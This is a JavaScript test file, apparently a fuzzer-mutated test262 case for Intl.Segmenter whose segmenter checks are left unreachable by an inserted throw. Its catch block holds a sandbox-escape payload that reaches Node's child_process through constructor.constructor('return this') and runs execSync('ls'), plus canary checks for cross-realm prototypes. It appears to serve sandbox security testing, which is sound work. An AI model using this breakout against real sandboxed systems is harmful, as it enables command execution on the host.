try {
    const input = 'a b c';
    const granularities = [
        undefined,
        'grapheme',
        'word',
        'sentence'
    ];
    const index_to_zeros = [
        0,
        -0,
        NaN,
        0.49,
        -0.49,
        null,
        undefined,
        false,
        '\uD800\uDC00',
        '\uD800',
        '\uDC00',
        'a',
        'g',
        'Ý',
        '0',
        '+0',
        '-0',
        '0.49',
        '+0.49',
        '-0.49',
        '4.9e-1',
        '-4.9e-1',
        '4.9E-1',
        '-4.9E-1'
    ];
    granularities.forEach(function (granularity) {
        throw () => {
            return () => {
            };
        };
        const segmenter = new Intl.Segmenter(undefined, { granularity });
        const segment = segmenter.segment(input);
        index_to_zeros.forEach(function (index) {
            const result = segment.containing(index);
            assert.sameValue(0, result.index);
            assert.sameValue(input, result.input);
        });
    });
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}